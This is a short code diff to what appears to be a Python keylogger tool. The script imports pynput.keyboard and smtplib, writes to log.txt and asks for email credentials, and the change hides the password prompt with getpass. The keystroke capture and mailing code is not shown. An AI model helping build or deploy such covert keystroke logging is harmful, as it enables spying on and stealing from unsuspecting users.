@@ -7,6 +7,7 @@ from email.mime.text import MIMEText
 import pynput.keyboard
 import smtplib
 import time
+import getpass
 
 banner()
 
@@ -14,7 +15,7 @@ banner()
 logs = open('log.txt','w+')
 
 from_mail = input("From => ")
-password_mail = input("Password => ")
+password_mail = getpass.getpass("Password => ")
 to_mail = input("To => ")
 subject_mail = input("Subject => ")
 print("\n\033[1;37mSTOP: \033[1;33mKEY-ESC\033[0m")
